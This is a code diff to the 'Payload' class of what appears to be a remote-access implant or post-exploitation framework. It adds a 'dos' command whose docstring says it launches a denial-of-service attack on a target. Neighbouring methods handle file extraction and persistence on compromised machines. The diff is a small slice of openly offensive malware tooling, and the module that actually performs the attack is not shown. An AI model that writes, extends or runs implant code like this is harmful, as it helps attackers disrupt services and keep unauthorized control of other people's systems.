@@ -956,7 +956,21 @@ class Payload():
             result = "{} error: {}".format(self.fileextractor.__name__, str(e))
             log(result)
             return result
-
+    
+    @config(platforms=['linux','linux2'], command=True, usage='dos')
+    def dos(self, args=None):
+        """
+        Launch a DoS attack to a target
+        """
+        try:
+            if 'dos' not in globals():
+                self.load('dos')
+            data = globals()['dos'].run(args)
+            return data
+        except Exception as e:
+            result = "{} error: {}".format(self.dos.__name__, str(e))
+            log(result)
+            return result
 
     @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='persistence <add/remove> [method]')
     def persistence(self, args=None):
